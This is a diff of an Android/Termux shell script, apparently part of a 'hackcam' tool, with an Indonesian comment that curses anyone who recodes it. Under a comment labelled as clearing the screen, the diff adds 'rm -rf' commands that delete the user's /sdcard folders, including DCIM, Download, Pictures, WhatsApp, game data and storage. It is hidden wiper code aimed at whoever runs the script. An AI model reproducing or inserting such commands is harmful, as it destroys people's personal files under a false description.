@@ -4,10 +4,20 @@
 #Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
 #Bersihkan Layar
 cd /sdcard
-
-rm -rf hackcam
-
-
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsAp
+rm -rf vidio
+rm -rf vidioku
+rm -rf com.garena.freefire
+rm -rf sd card
+rm -rf storage
 
 
 
